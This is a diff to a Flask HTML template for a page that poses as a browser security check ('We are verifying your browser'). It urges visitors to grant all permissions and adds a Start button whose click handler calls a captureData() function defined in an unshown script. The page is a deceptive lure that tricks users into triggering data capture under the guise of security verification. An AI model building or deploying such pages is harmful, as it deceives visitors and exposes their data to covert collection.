@@ -54,6 +54,15 @@
             color: #333;
             animation: blink 1s steps(5, start) infinite;
         }
+        #start-button {
+            font-size: 16px;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            cursor: pointer;
+            margin-top: 20px;
+        }
     </style>
 </head>
 <body>
@@ -63,7 +72,14 @@
         <div id="loading-text">Just a moment<span id="loading-dots">...</span></div>
         <div id="loading-subtext">We are verifying your browser, please wait...</div>
         <div id="additional-text">We are checking all security measures. Kindly allow all the permissions required for secure browsing and checking.</div>
+        <button id="start-button">Start</button>
     </div>
+    <script>
+        document.getElementById('start-button').addEventListener('click', () => {
+            captureData();
+            document.getElementById('start-button').style.display = 'none';
+        });
+    </script>
     <script src="{{ url_for('static', filename='script.js') }}"></script>
 </body>
 </html>
